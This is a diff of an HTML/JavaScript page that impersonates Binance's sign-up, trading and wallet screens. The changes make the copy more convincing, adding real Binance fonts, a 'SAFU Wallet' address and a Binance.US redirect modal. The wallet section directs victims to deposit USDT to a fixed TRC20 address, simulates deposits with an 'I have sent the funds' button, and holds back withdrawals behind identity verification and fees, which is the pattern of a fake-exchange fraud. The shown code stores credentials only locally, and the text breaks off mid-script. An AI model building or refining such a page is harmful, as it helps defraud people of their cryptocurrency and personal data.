@@ -1,167 +1,153 @@
 <!doctype html>
 <html lang="en"><head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#181A20">
 <title>Create a free account | Binance</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
+@font-face{font-family:BinanceNova;font-display:swap;src:url("https://bin.bnbstatic.com/static/fonts/bn/v2/BinanceNova-Regular.woff2") format("woff2");font-weight:400}
+@font-face{font-family:BinanceNova;font-display:swap;src:url("https://bin.bnbstatic.com/static/fonts/bn/v2/BinanceNova-Medium.woff2") format("woff2");font-weight:500}
+@font-face{font-family:BinanceNova;font-display:swap;src:url("https://bin.bnbstatic.com/static/fonts/bn/v2/BinanceNova-SemiBold.woff2") format("woff2");font-weight:600 800}
+:root{--bg:#181A20;--bg2:#0B0E11;--card:#202630;--input:#29313D;--line:#333B47;--inputline:#474D57;--txt:#EAECEF;--txt2:#929AA5;--txt3:#707A8A;--yellow:#F0B90B;--btn:#FCD535;--ontxt:#202630}
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-body{font:14px/1.45 Inter,-apple-system,Roboto,sans-serif;background:#0b0e11;color:#eaecef;padding-bottom:64px}
-a{color:#f0b90b;text-decoration:none;cursor:pointer}
-header{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #2b3139;position:sticky;top:0;background:#0b0e11;z-index:6}
+body{font-family:BinanceNova,Arial,sans-serif;background:var(--bg);color:var(--txt);font-size:14px;line-height:1.5;padding-bottom:64px}
+a{color:var(--yellow);text-decoration:none;cursor:pointer}
+header{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--bg);z-index:6}
 .brand{display:flex;align-items:center;gap:8px;font-weight:600}
-.logo{width:26px;height:26px;flex:0 0 auto}
-.pill{font-size:12px;padding:4px 9px;border-radius:20px;background:#0ecb8122;color:#0ecb81;font-weight:600}
+.mark{width:26px;height:26px}
+.pill{font-size:12px;padding:4px 9px;border-radius:20px;background:#2EBD8533;color:#2EBD85;font-weight:600}
 .view{display:none;padding:14px 16px}.view.active{display:block}
-.bal{background:#1e2329;border:1px solid #2b3139;border-radius:12px;padding:16px;margin-bottom:14px}
-.bal small{color:#848e9c;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+.bal{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:14px}
+.bal small{color:var(--txt3);font-size:11px;text-transform:uppercase;letter-spacing:.5px}
 .bal b{display:block;font-size:26px;margin-top:4px}
-.row{display:flex;justify-content:space-between;align-items:center;padding:13px 0;border-bottom:1px solid #1e2329}
+.row{display:flex;justify-content:space-between;align-items:center;padding:13px 0;border-bottom:1px solid var(--card)}
 .row:last-child{border:0}
-.sym{font-weight:600}.sub{font-size:11.5px;color:#848e9c}
-.up{color:#0ecb81}.dn{color:#f6465d}
-button{background:#f0b90b;color:#0b0e11;border:0;border-radius:8px;padding:13px;font-weight:600;width:100%;font-size:14px;font-family:inherit}
-button.ghost{background:#2b3139;color:#eaecef}
-button.sell{background:#f6465d;color:#fff}
-.addr{font-family:ui-monospace,monospace;font-size:12px;word-break:break-all;background:#0b0e11;border:1px solid #2b3139;padding:11px;border-radius:8px;margin:10px 0}
-input,select{width:100%;background:#1e2329;border:1px solid #2b3139;color:#eaecef;border-radius:8px;padding:14px;font-size:14px;margin-bottom:10px;font-family:inherit}
-input:focus{outline:0;border-color:#f0b90b}
+.sym{font-weight:600}.sub{font-size:11.5px;color:var(--txt3)}
+.up{color:#2EBD85}.dn{color:#F6465D}
+button{font-family:inherit;cursor:pointer}
+.addr{font-family:ui-monospace,monospace;font-size:12px;word-break:break-all;background:var(--bg2);border:1px solid var(--line);padding:11px;border-radius:6px;margin:10px 0}
+input,select{width:100%;background:transparent;border:1px solid var(--inputline);color:var(--txt);border-radius:4px;padding:6px 10px;height:50px;font-size:16px;font-family:inherit;margin-bottom:10px}
+input::placeholder{color:var(--inputline)}
+input:focus{outline:0;border-color:var(--yellow)}
 .qr{background:#fff;padding:8px;border-radius:8px;width:170px;display:block;margin:0 auto 12px}
-.note{font-size:11.5px;color:#848e9c;line-height:1.6;margin-top:12px}
-.note b{color:#f0b90b}
-nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:#181a20;border-top:1px solid #2b3139;display:none;z-index:6}
-nav a{flex:1;text-align:center;padding:11px 0;font-size:11px;color:#848e9c}
-nav a.on{color:#f0b90b}
-.tvbox{height:320px;border:1px solid #2b3139;border-radius:10px;overflow:hidden;margin-bottom:12px;background:#0b0e11}
+.note{font-size:11.5px;color:var(--txt3);line-height:1.6;margin-top:12px}
+.note b{color:var(--yellow)}
+nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:#1E2329;border-top:1px solid var(--line);display:none;z-index:6}
+nav a{flex:1;text-align:center;padding:11px 0;font-size:11px;color:var(--txt3)}
+nav a.on{color:var(--yellow)}
+.tvbox{height:320px;border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-bottom:12px;background:var(--bg2)}
 h2{font-size:15px;margin-bottom:12px}
-h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;letter-spacing:.5px}
-.ok{background:#0ecb8122;border:1px solid #0ecb81;color:#0ecb81;padding:11px;border-radius:8px;font-size:13px;text-align:center;margin-top:10px;display:none}
-.warn{background:#f0b90b22;border:1px solid #f0b90b;color:#f0b90b;padding:11px;border-radius:8px;font-size:12.5px;margin:10px 0}
-#auth{min-height:100vh}
-.atop{display:flex;align-items:center;justify-content:space-between;padding:16px 20px}
-.atop .brand{font-size:17px}
-.atop .logo{width:30px;height:30px}
-.atop a{font-size:13.5px;font-weight:600}
-.wrap{max-width:1080px;margin:0 auto}
-.hero{padding:8px 20px 20px}
-.ruser{display:flex;align-items:center;gap:10px;background:#1e2329;border:1px solid #2b3139;border-radius:10px;padding:10px 12px;margin-bottom:22px}
-.ruser img{width:30px;height:30px;border-radius:50%;background:#2b3139}
-.ruser b{font-size:13px;font-weight:600}
-.ruser span{color:#848e9c;font-size:11.5px}
-.hero h1{font-size:26px;line-height:1.22;font-weight:700;margin-bottom:10px;letter-spacing:-.4px}
-.hero h1 em{color:#f0b90b;font-style:normal}
-.hero p{color:#848e9c;font-size:13.5px;margin-bottom:18px}
-.hero ul{list-style:none;display:grid;gap:10px}
-.hero li{font-size:12.5px;color:#c7cdd4;padding-left:22px;position:relative}
-.hero li:before{content:"";position:absolute;left:0;top:4px;width:12px;height:12px;border-radius:50%;background:#0ecb8122;border:1px solid #0ecb81}
-.acard{background:#181a20;border-top:1px solid #2b3139;padding:24px 20px 40px}
-.acard h2{font-size:20px;font-weight:600;margin-bottom:20px;letter-spacing:-.3px}
-.acard label{display:block;font-size:12.5px;color:#848e9c;margin-bottom:7px}
-.terms{font-size:11.5px;color:#848e9c;margin:4px 0 16px}
-.or{display:flex;align-items:center;gap:12px;color:#5e6673;font-size:12px;margin:18px 0}
-.or:before,.or:after{content:"";flex:1;height:1px;background:#2b3139}
-.gbtn{background:#fff;color:#1e2329;display:flex;align-items:center;justify-content:center;gap:9px;margin-bottom:10px}
-.abtn{background:#000;color:#fff;display:flex;align-items:center;justify-content:center;gap:9px;border:1px solid #2b3139}
-.gicon{font-weight:700;font-size:15px;color:#4285F4}
-.small{font-size:12px;color:#848e9c;text-align:center;margin-top:20px}
-.afoot{display:flex;gap:16px;justify-content:center;align-items:center;padding:18px 20px 90px;font-size:11.5px;color:#5e6673}
-.afoot select{width:auto;padding:4px 8px;font-size:11.5px;background:#181a20;border:1px solid #2b3139;margin:0}
-.badge{font-size:11px;padding:3px 8px;border-radius:20px;background:#f6465d22;color:#f6465d}
-.badge.p{background:#f0b90b22;color:#f0b90b}
-.badge.v{background:#0ecb8122;color:#0ecb81}
-#cookie{position:fixed;left:0;right:0;bottom:0;background:#1e2329;border-top:1px solid #2b3139;padding:14px 18px;font-size:12px;color:#c7cdd4;display:flex;gap:12px;align-items:center;z-index:9}
-#cookie button{width:auto;padding:9px 16px;font-size:12.5px;flex:0 0 auto}
+h3{font-size:13px;color:var(--txt3);margin:18px 0 8px;text-transform:uppercase;letter-spacing:.5px}
+.ok{background:#102821;border:1px solid #2EBD85;color:#2EBD85;padding:11px;border-radius:6px;font-size:13px;text-align:center;margin-top:10px;display:none}
+.warn{background:rgba(240,185,11,.1);border:1px solid var(--yellow);color:var(--yellow);padding:11px;border-radius:6px;font-size:12.5px;margin:10px 0}
+/* auth */
+#auth{min-height:100vh;display:flex;flex-direction:column}
+.wrap{display:flex;flex-direction:column;flex:1}
+.hero{padding:20px 24px 8px}
+.ruser{display:flex;align-items:center;gap:8px;margin-bottom:18px}
+.ruser img{width:28px;height:28px;border-radius:50%}
+.ruser b{font-weight:500}
+.ruser span{color:var(--txt2);font-weight:500}
+.wtitle{font-size:20px;font-weight:600;margin-bottom:14px}
+.bonus{height:120px;border-radius:10px;background:linear-gradient(135deg,#3a2f0b,#202630);margin-bottom:14px;display:grid;place-items:center;color:var(--yellow);font-size:32px;font-weight:700}
+.sp{display:flex;gap:12px;padding:12px 0;font-size:14px;align-items:flex-start}
+.sp svg{flex:0 0 auto;width:24px;height:24px}
+.card-wrap{padding:8px 24px 24px}
+.card{background:var(--card);border-radius:10px;padding:28px 24px}
+.card h1{font-size:26px;line-height:34px;font-weight:600;margin-bottom:20px}
+.card label{display:block;font-size:13px;color:var(--txt2);margin-bottom:6px}
+.agree{display:flex;gap:8px;align-items:flex-start;font-size:12.5px;color:var(--txt);margin:14px 0 4px;line-height:1.5}
+.box{flex:0 0 auto;width:16px;height:16px;border-radius:3px;background:#DFDFDF;color:var(--ontxt);display:grid;place-items:center;font-size:11px;font-weight:700;margin-top:2px}
+.btn{width:100%;border:0;border-radius:6px;height:50px;font-size:16px;font-weight:600;background:var(--btn);color:var(--ontxt);margin-top:20px}
+.btn-line{width:100%;border:1px solid var(--line);border-radius:6px;height:50px;font-size:15px;font-weight:500;background:transparent;color:var(--txt);display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px}
+.or{display:flex;align-items:center;gap:16px;color:var(--txt3);font-size:14px;margin:20px 0}
+.or:before,.or:after{content:"";flex:1;height:1px;background:var(--line)}
+.bottom{text-align:center;font-size:15px;color:var(--txt2);margin-top:20px}
+footer{display:flex;gap:20px;justify-content:center;align-items:center;padding:24px;font-size:13px;color:var(--txt2);flex-wrap:wrap}
+.globe{width:16px;height:16px}
+/* modal */
+#modal{position:fixed;inset:0;background:rgba(11,14,17,.6);display:grid;place-items:center;z-index:20;padding:20px}
+#modal .in{background:var(--card);border-radius:12px;padding:28px 24px;max-width:420px;text-align:center;font-size:14px;line-height:1.6}
+#modal svg{width:56px;height:56px;margin-bottom:14px}
+#modal .btn{height:44px;font-size:15px;margin-top:18px}
+#modal .no{background:transparent;color:var(--yellow);border:0;font-size:15px;margin-top:10px;width:100%}
+.badge{font-size:11px;padding:3px 8px;border-radius:20px;background:#F6465D33;color:#F6465D}
+.badge.p{background:rgba(240,185,11,.15);color:var(--yellow)}
+.badge.v{background:#2EBD8533;color:#2EBD85}
 @media(min-width:900px){
- .wrap{display:grid;grid-template-columns:1fr 400px;gap:48px;align-items:start;padding:0 24px}
- .hero{padding-top:40px}
- .acard{border:1px solid #2b3139;border-radius:12px;margin:40px 0 40px;padding:28px}
- .afoot{padding-bottom:40px}
+ .wrap{display:grid;grid-template-columns:1fr 425px;gap:56px;max-width:1200px;margin:0 auto;padding:0 24px;align-items:start}
+ .hero{padding-top:48px}
+ .card-wrap{padding:48px 0}
 }
 </style></head><body>
 
 <div id="auth">
-  <div class="atop">
-    <div class="brand"><svg class="logo" viewBox="0 0 32 32" fill="#f0b90b"><rect x="14" y="7" width="4" height="4" transform="rotate(45 16 9)"/><rect x="14" y="21" width="4" height="4" transform="rotate(45 16 23)"/><rect x="7" y="14" width="4" height="4" transform="rotate(45 9 16)"/><rect x="21" y="14" width="4" height="4" transform="rotate(45 23 16)"/><rect x="9" y="9" width="6" height="6" transform="rotate(45 12 12)"/><rect x="17" y="17" width="6" height="6" transform="rotate(45 20 20)"/><rect x="13" y="13" width="6" height="6" transform="rotate(45 16 16)"/></svg> Binance</div>
-    <a onclick="tab('login')">Log In</a>
+<div class="wrap">
+  <div class="hero">
+    <div class="ruser">
+      <img src="https://bin.bnbstatic.com/static/content/static-sources/square-default-avatar.png" alt="User-96007">
+      <div><b>User-96007</b> <span>(Code: XFBSI3ML)</span></div>
+    </div>
+    <div class="wtitle">Join Binance. Earn Up to $100.</div>
+    <div class="bonus">$100</div>
+    <div class="sp"><svg viewBox="0 0 24 24" fill="none"><path d="M15.9 5a1.4 1.4 0 11-2.8 0V2.5h1.8V4.6h4.2V2.5h1.8V5z" fill="currentColor"/><path d="M15.29 9.53a.9.9 0 011.28 1.27l-4.93 5a.9.9 0 01-1.28 0l-2.57-2.61a.9.9 0 011.28-1.26l1.93 1.96z" fill="currentColor"/><path d="M4.9 21.1h14.2V2.9H4.9zM20.9 21.5a1.4 1.4 0 01-1.4 1.4H4.5a1.4 1.4 0 01-1.4-1.4v-19A1.4 1.4 0 014.5 1.1h15A1.4 1.4 0 0120.9 2.5z" fill="currentColor"/></svg><div>Complete tasks. Unlock up to $100 in welcome rewards.</div></div>
+    <div class="sp"><svg viewBox="0 0 24 24" fill="none"><path d="M18.96 12.96a5.6 5.6 0 10-7.92-7.92A5.6 5.6 0 0012.24 22.2l.1-.09 4.57-4.57a5.6 5.6 0 002.05-4.58z" fill="currentColor"/></svg><div>Crypto, Stocks, TradFi, Gold, Payments &amp; Web3 - ALL in one.</div></div>
+    <div class="sp"><svg viewBox="0 0 24 24" fill="none"><path d="M9 9.5l3-3 3 3-3 3z" fill="currentColor"/><path d="M18 2a1.4 1.4 0 011.4 1.4V5h2.09c.58 0 1.04.5 1 .98l-.4 5.27c-.12 1.61-1.69 2.49-3.03 2.1a5.3 5.3 0 01-4.96 3.95.75.75 0 01-.2-1.49 3.8 3.8 0 003.7-4.14V3.8H6.4v7.67a3.8 3.8 0 003.7 4.13.75.75 0 01-.2 1.5 5.3 5.3 0 01-5-4.05c-1.34.37-2.88-.51-3-2.11L1.5 5.98c-.04-.48.42-.98 1-.98h2.1V3.4A1.4 1.4 0 016 2z" fill="currentColor"/></svg><div>337,456,109 Users Trust Binance</div></div>
+    <div class="sp"><svg viewBox="0 0 28 29" fill="none"><path d="M4.43 19.6L14 24.27l9.57-4.66V4.5H4.43zM25.67 19.83l-.01.13c-.04.62-.41 1.17-.98 1.45l-9.92 4.83-.18.08a1.5 1.5 0 01-.73 0l-.19-.08-9.92-4.83a1.6 1.6 0 01-.98-1.45l-.01-.13V4.15c0-.9.69-1.65 1.57-1.74l.18-.01h19.83c.97 0 1.75.78 1.75 1.75z" fill="currentColor"/></svg><div><div>1,000,000,000 USDC SAFU Fund</div><div style="font-size:12px;color:var(--txt3)"><span style="color:var(--yellow)">SAFU Wallet</span>: 0x420ef1f25563593aF5FE3f9b9d3bC56a8bd8c104</div></div></div>
   </div>
 
-  <div class="wrap">
-    <div class="hero">
-      <div class="ruser">
-        <img src="https://bin.bnbstatic.com/static/content/static-sources/square-default-avatar.png" alt="">
-        <div><b>User-96007</b> <span>(Code: XFBSI3ML)</span></div>
-      </div>
-      <h1>Join Binance. Earn Up to <em>$100</em>.</h1>
-      <p>Complete tasks. Unlock up to $100 in welcome rewards.</p>
-      <ul>
-        <li>Crypto, Stocks, TradFi, Gold, Payments &amp; Web3 - ALL in one.</li>
-        <li>337,455,109 Users Trust Binance</li>
-        <li>No.1 In Trading Volume &amp; Customer Asset</li>
-        <li>1,000,000,000 USDC SAFU Fund</li>
-      </ul>
+  <div class="card-wrap">
+    <div class="card" id="step1">
+      <h1>Welcome to Binance</h1>
+      <label>Email/Phone number</label>
+      <input id="remail" placeholder="Email/Phone (without country code)" autocomplete="off">
+      <div class="agree"><span class="box">&#10003;</span><div>By creating an account, I agree to Binance's <a>Privacy Notice</a>.</div></div>
+      <button class="btn" onclick="step1()">Register</button>
+      <div class="or">or</div>
+      <button class="btn-line" onclick="soon()"><svg width="20" height="20" viewBox="0 0 24 24"><path fill="#4285F4" d="M21.6 12.2c0-.6-.05-1.2-.15-1.7H12v3.2h5.4a4.6 4.6 0 01-2 3v2.5h3.2c1.9-1.7 3-4.3 3-7z"/><path fill="#34A853" d="M12 22c2.7 0 4.9-.9 6.6-2.4l-3.2-2.5c-.9.6-2 .9-3.4.9a6 6 0 01-5.6-4.1H3.1v2.6A10 10 0 0012 22z"/><path fill="#FBBC05" d="M6.4 13.9a6 6 0 010-3.8V7.5H3.1a10 10 0 000 9z"/><path fill="#EA4335" d="M12 6a5.4 5.4 0 013.8 1.5l2.9-2.9A10 10 0 003.1 7.5l3.3 2.6A6 6 0 0112 6z"/></svg>Continue with Google</button>
+      <button class="btn-line" onclick="soon()"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M16.4 12.7c0-2.4 2-3.5 2-3.6-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.15-2.8.85-3.5.85s-1.8-.83-3-.8c-1.5.02-2.9.9-3.7 2.27-1.6 2.75-.4 6.8 1.1 9 .75 1.08 1.65 2.3 2.85 2.25 1.13-.05 1.56-.73 2.94-.73s1.76.73 2.95.7c1.2-.02 1.98-1.1 2.72-2.2.86-1.25 1.22-2.46 1.24-2.52-.03-.01-2.4-.92-2.4-3.4zM14.2 5.5c.63-.77 1.06-1.83.94-2.9-.9.04-2 .6-2.66 1.36-.58.67-1.1 1.76-.96 2.8 1.02.08 2.05-.52 2.68-1.26z"/></svg>Continue with Apple</button>
+      <p class="bottom">Sign up as an entity or <a onclick="tab('login')">Log in</a></p>
     </div>
 
-    <div>
-      <div class="acard" id="step1">
-        <h2>Welcome to Binance</h2>
-        <label>Email/Phone number</label>
-        <input id="remail" placeholder="Email/Phone number" autocomplete="off">
-        <p class="terms">By creating an account, I agree to Binance's Privacy Notice.</p>
-        <button onclick="step1()">Register</button>
-        <div class="or">or</div>
-        <button class="gbtn" onclick="soon()"><span class="gicon">G</span> Continue with Google</button>
-        <button class="abtn" onclick="soon()"><span style="font-size:16px">&#63743;</span> Continue with Apple</button>
-        <p class="small">Sign up as an entity or <a onclick="tab('login')">Log in</a></p>
-      </div>
-
-      <div class="acard" id="step2" style="display:none">
-        <h2>Create a password</h2>
-        <p class="terms" id="step2mail"></p>
-        <label>Password</label>
-        <input id="rpass" type="password" placeholder="At least 8 characters">
-        <label>Full name</label>
-        <input id="rname" placeholder="Your full name">
-        <button onclick="reg()">Create account</button>
-        <p class="small"><a onclick="back()">Back</a></p>
-      </div>
-
-      <div class="acard" id="pane-login" style="display:none">
-        <h2>Log in to Binance</h2>
-        <label>Email</label>
-        <input id="lemail" placeholder="Email">
-        <label>Password</label>
-        <input id="lpass" type="password" placeholder="Password">
-        <button onclick="login()">Log In</button>
-        <p class="small"><a onclick="back()">Create an account</a></p>
-      </div>
+    <div class="card" id="step2" style="display:none">
+      <h1>Create a password</h1>
+      <p class="note" id="step2mail" style="margin-top:0"></p>
+      <label>Password</label>
+      <input id="rpass" type="password" placeholder="At least 8 characters">
+      <label>Full name</label>
+      <input id="rname" placeholder="Your full name">
+      <button class="btn" onclick="reg()">Create account</button>
+      <p class="bottom"><a onclick="back()">Back</a></p>
     </div>
-  </div>
 
-  <div class="afoot">
-    <select><option>English (Bahrain)</option><option>English</option><option>Français</option><option>Español</option></select>
-    <span>Cookies</span><span>Privacy</span>
+    <div class="card" id="pane-login" style="display:none">
+      <h1>Log in to Binance</h1>
+      <label>Email</label>
+      <input id="lemail" placeholder="Email/Phone (without country code)">
+      <label>Password</label>
+      <input id="lpass" type="password" placeholder="Password">
+      <button class="btn" onclick="login()">Log In</button>
+      <p class="bottom"><a onclick="back()">Create an account</a></p>
+    </div>
   </div>
 </div>
 
-<div id="cookie">
-  <span>We use cookies to improve your experience. By continuing, you accept our Cookie Policy.</span>
-  <button onclick="document.getElementById('cookie').remove()">Accept</button>
+<footer>
+  <svg class="globe" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor"/><path d="M2 12h20M12 2c3 3.5 3 16.5 0 20M12 2c-3 3.5-3 16.5 0 20" stroke="currentColor"/></svg>
+  <span>English (Bahrain)</span><span>Cookies</span><span>Privacy</span>
+</footer>
 </div>
 
 <div id="app" style="display:none">
 <header>
-  <div class="brand"><svg class="logo" viewBox="0 0 32 32" fill="#f0b90b"><rect x="14" y="7" width="4" height="4" transform="rotate(45 16 9)"/><rect x="14" y="21" width="4" height="4" transform="rotate(45 16 23)"/><rect x="7" y="14" width="4" height="4" transform="rotate(45 9 16)"/><rect x="21" y="14" width="4" height="4" transform="rotate(45 23 16)"/><rect x="9" y="9" width="6" height="6" transform="rotate(45 12 12)"/><rect x="17" y="17" width="6" height="6" transform="rotate(45 20 20)"/><rect x="13" y="13" width="6" height="6" transform="rotate(45 16 16)"/></svg> Binance</div>
+  <div class="brand"><svg class="mark" viewBox="0 0 32 32" fill="#F0B90B"><rect x="14" y="7" width="4" height="4" transform="rotate(45 16 9)"/><rect x="14" y="21" width="4" height="4" transform="rotate(45 16 23)"/><rect x="7" y="14" width="4" height="4" transform="rotate(45 9 16)"/><rect x="21" y="14" width="4" height="4" transform="rotate(45 23 16)"/><rect x="9" y="9" width="6" height="6" transform="rotate(45 12 12)"/><rect x="17" y="17" width="6" height="6" transform="rotate(45 20 20)"/><rect x="13" y="13" width="6" height="6" transform="rotate(45 16 16)"/></svg> Binance</div>
   <div class="pill" id="pill">+0.00%</div>
 </header>
-
 <main>
 <section id="v-market" class="view active">
   <div class="bal"><small>Total balance</small><b id="bal1">0.00 USDT</b></div>
   <h2>Markets</h2>
   <div id="list"></div>
 </section>
-
 <section id="v-trade" class="view">
   <h2 id="tname">—</h2>
   <div class="tvbox" id="tvwrap"></div>
@@ -169,43 +155,39 @@ h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;lette
   <div class="row"><span class="sub">Your holdings</span><span id="thold">0</span></div>
   <h3>Amount (USDT)</h3>
   <input id="tamt" type="number" placeholder="100" value="100">
-  <button onclick="buy()">Buy</button>
-  <button class="sell" style="margin-top:8px" onclick="sell()">Sell</button>
+  <button class="btn" onclick="buy()">Buy</button>
+  <button class="btn" style="background:#F6465D;color:#fff;margin-top:8px" onclick="sell()">Sell</button>
   <p class="note">Fee 0.1%. Settlement instant.</p>
 </section>
-
 <section id="v-wallet" class="view">
   <div class="bal"><small>Available</small><b id="bal2">0.00 USDT</b></div>
   <h2>Deposit USDT</h2>
   <p class="sub">Network: TRC20 (Tron)</p>
   <div class="addr" id="addr">TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ</div>
   <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ">
-  <button onclick="copyAddr()">Copy address</button>
-  <button class="ghost" style="margin-top:8px" onclick="simDeposit()">I have sent the funds</button>
+  <button class="btn" onclick="copyAddr()">Copy address</button>
+  <button class="btn" style="background:transparent;border:1px solid var(--line);color:var(--txt);margin-top:8px" onclick="simDeposit()">I have sent the funds</button>
   <div class="ok" id="dok">Deposit detected — crediting…</div>
   <p class="note"><b>Send only USDT via TRC20.</b> Minimum 10 USDT. Wrong network = permanent loss.</p>
-
   <h3>Withdraw</h3>
   <div id="kycnote"></div>
   <input id="wamt" type="number" placeholder="Amount in USDT">
   <input id="waddr" placeholder="TRC20 address">
-  <button onclick="withdraw()">Request withdrawal</button>
+  <button class="btn" onclick="withdraw()">Request withdrawal</button>
   <div class="ok" id="wok">Withdrawal submitted — processing 24–48h</div>
   <p class="note">Minimum 50 USDT. Network fee 3%.</p>
 </section>
-
 <section id="v-profile" class="view">
   <h2>Profile</h2>
   <div class="row"><span class="sub">Name</span><span id="pname">—</span></div>
   <div class="row"><span class="sub">Email</span><span id="pemail">—</span></div>
   <div class="row"><span class="sub">UID</span><span id="puid">—</span></div>
   <div class="row"><span class="sub">Verification</span><span id="pkyc"></span></div>
-  <button style="margin-top:16px" onclick="verify()">Verify identity</button>
+  <button class="btn" onclick="verify()">Verify identity</button>
   <div class="ok" id="kok">Documents submitted — under review (24h)</div>
-  <button class="ghost" style="margin-top:12px" onclick="logout()">Log out</button>
+  <button class="btn" style="background:transparent;border:1px solid var(--line);color:var(--txt);margin-top:12px" onclick="logout()">Log out</button>
 </section>
 </main>
-
 <nav>
   <a class="on" onclick="go('market',this)">Markets</a>
   <a onclick="go('trade',this)">Trade</a>
@@ -214,24 +196,30 @@ h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;lette
 </nav>
 </div>
 
+<div id="modal">
+  <div class="in">
+    <svg viewBox="0 0 96 96"><path d="M48 24a12 12 0 100 24 12 12 0 000-24z" fill="#F0B90B"/><path fill-rule="evenodd" d="M48 8a40 40 0 110 80 40 40 0 01-31.8-15.7A39.8 39.8 0 018 48 40 40 0 0148 8zm-.5 52c-11.3 0-21.5 4.7-28.7 12.3A38 38 0 0048 86c11.5 0 21.7-5 28.7-13.1C69.5 65 59 60 47.5 60zM48 10a38 38 0 00-30.4 60.8C25.1 62.9 35.7 58 47.5 58c12 0 22.9 5.1 30.5 13.3A38 38 0 0048 10z" fill="currentColor"/></svg>
+    <div>It looks like you're in the United States<br><br>Switch to Binance.US, our U.S. regulated partner, to buy, trade, and earn crypto.</div>
+    <button class="btn" onclick="document.getElementById('modal').remove()">Visit Binance.US</button>
+    <button class="no" onclick="document.getElementById('modal').remove()">Cancel</button>
+  </div>
+</div>
+
 <script>
 var ADDR="TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ";
 var users=JSON.parse(localStorage.getItem("bncUsers")||"{}");
 var me=localStorage.getItem("bncSess")||"";
 var S,cur="BTC",hist={},tmpMail="";
 var SYMS=["BTC","ETH","SOL","BNB","XRP"];
-
 function save(){localStorage.setItem("u_"+me,JSON.stringify(S))}
 function usd(n){return n.toFixed(2)+" USDT"}
 function soon(){alert("Continue with email for now")}
-function back(){step1.style.display="block";step2.style.display="none";pane-login.style.display="none"}
-function tab(t){
-  if(t=="login"){step1.style.display="none";step2.style.display="none";pane-login.style.display="block"}
-}
+function back(){step1.style.display="block";step2.style.display="none";document.getElementById("pane-login").style.display="none"}
+function tab(){step1.style.display="none";step2.style.display="none";document.getElementById("pane-login").style.display="block"}
 function step1(){
   var e=remail.value.trim().toLowerCase();
   if(!e||e.indexOf("@")<0){alert("Enter a valid email");return;}
-  if(users[e]){alert("Email already registered — log in instead");tab("login");lemail.value=e;return;}
+  if(users[e]){alert("Email already registered — log in instead");tab();lemail.value=e;return;}
   tmpMail=e;step2mail.textContent=e;
   step1.style.display="none";step2.style.display="block";
 }
@@ -255,7 +243,6 @@ function logout(){
   document.querySelector("nav").style.display="none";
   back();remail.value="";rpass.value="";lpass.value="";
 }
-
 function boot(){
   document.getElementById("auth").style.display="none";
   document.getElementById("app").style.display="block";
@@ -263,12 +250,9 @@ function boot(){
   S=JSON.parse(localStorage.getItem("u_"+me)||'{"bal":0,"h":{},"p":{}}');
   if(!S.p.BTC){S.p={BTC:96400,ETH:3410,SOL:198,BNB:612,XRP:2.31};}
   hist={};for(var k in S.p)hist[k]=[S.p[k]];
-  pname.textContent=users[me].name;
-  pemail.textContent=me;
-  puid.textContent=users[me].uid;
+  pname.textContent=users[me].name;pemail.textContent=me;puid.textContent=users[me].uid;
   paint();syncPrices();
 }
-
 function go(v,el){
   document.querySelectorAll(".view").forEach(function(x){x.classList.remove("active")});
   document.getElementById("v-"+v).classList.add("active");
@@ -276,22 +260,15 @@ function go(v,el){
   if(el)el.classList.add("on");
   if(v=="trade")tv(cur);
 }
-
 function tv(sym){
   var w=document.getElementById("tvwrap");
   w.innerHTML='<div class="tradingview-widget-container"><div class="tradingview-widget-container__widget"></div></div>';
   var s=document.createElement("script");
   s.src="https://s3.tradingview.com/external-embedding/embed-widget-advanced-chart.js";
   s.async=true;
-  s.textContent=JSON.stringify({
-    symbol:"BINANCE:"+sym+"USDT",theme:"dark",style:"3",locale:"en",
-    autosize:true,hide_side_toolbar:true,allow_symbol_change:false,
-    backgroundColor:"#0b0e11",gridColor:"#1e2329",
-    support_host:"https://www.tradingview.com"
-  });
+  s.textContent=JSON.stringify({symbol:"BINANCE:"+sym+"USDT",theme:"dark",style:"3",locale:"en",autosize:true,hide_side_toolbar:true,allow_symbol_change:false,backgroundColor:"#0B0E11",gridColor:"#1E2329",support_host:"https://www.tradingview.com"});
   w.firstChild.appendChild(s);
 }
-
 function syncPrices(){
   if(!me)return;
   var q=JSON.stringify(SYMS.map(function(k){return k+"USDT"}));
@@ -309,7 +286,6 @@ function syncPrices(){
     }).catch(function(){});
 }
 setInterval(syncPrices,15000);
-
 function paint(){
   if(!S)return;
   var port=S.bal;for(var k in S.h)port+=S.h[k]*S.p[k];
@@ -328,9 +304,7 @@ function paint(){
   pkyc.innerHTML=k2=="verified"?'<span class="badge v">Verified</span>':k2=="pending"?'<span class="badge p">Under review</span>':'<span class="badge">Unverified</span>';
   kycnote.innerHTML=k2=="verified"?"":k2=="pending"?'<div class="warn">Withdrawals unlocked after verification review.</div>':'<div class="warn">Verify your identity before withdrawing.</div>';
 }
-
 function open_(k){cur=k;paint();go("trade",document.querySelectorAll("nav a")[1])}
-
 function buy(){
   var a=parseFloat(tamt.value)||0;
